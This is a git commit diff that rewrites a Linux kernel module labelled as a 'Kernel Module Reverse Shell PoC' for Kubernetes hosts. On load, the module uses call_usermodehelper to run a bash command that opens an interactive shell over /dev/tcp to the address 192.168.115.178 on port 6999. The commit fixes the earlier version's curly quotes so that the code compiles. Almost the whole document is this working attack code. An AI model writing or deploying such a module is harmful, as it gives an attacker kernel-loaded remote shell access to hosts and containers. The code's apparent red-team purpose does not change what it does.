311d0b8b37b048a134099346d3bc9fc5ae21d3ab
redbluesecurity <redbluesec10@gmail.com>
2025-05-31 23:28:15 -0400

    k8s-lkm-reverse-shell.c

--- k8s-lkm-reverse-shell.c
+++ k8s-lkm-reverse-shell.c
@@ -1,20 +1,37 @@
-#include <linux/kmod.h>
-#include <linux/init.h>
-#include <linux/kernel.h>
 #include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/init.h>
+#include <linux/kmod.h>
 
-static char command[50] = “bash -i >& /dev/tcp/192.168.115.178/6999 0>&1”;
-char* argv[] = {“/bin/bash”, “-c”, command, NULL};
-static char* envp[] = {“HOME=/”, NULL};
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("RBT Security");
+MODULE_DESCRIPTION("Kernel Module Reverse Shell PoC");
+MODULE_VERSION("0.1");
 
-static int __init connect_back_init(void) {
+static char *argv[] = {
+    "/bin/bash",
+    "-c",
+    "bash -i >& /dev/tcp/192.168.115.178/6999 0>&1",
+    NULL
+};
+
+static char *envp[] = {
+    "HOME=/",
+    "TERM=xterm",
+    NULL
+};
+
+static int __init reverse_shell_init(void)
+{
+    printk(KERN_INFO "[+] Reverse shell module loaded\n");
     return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
 }
 
-static void __exit connect_back_exit(void) {
-    printk(KERN_INFO “Reverse shell exiting\n”);
+static void __exit reverse_shell_exit(void)
+{
+    printk(KERN_INFO "[-] Reverse shell module unloaded\n");
 }
 
-module_init(connect_back_init);
-module_exit(connect_back_exit);
-MODULE_LICENSE(“GPL”);
+module_init(reverse_shell_init);
+module_exit(reverse_shell_exit);
+
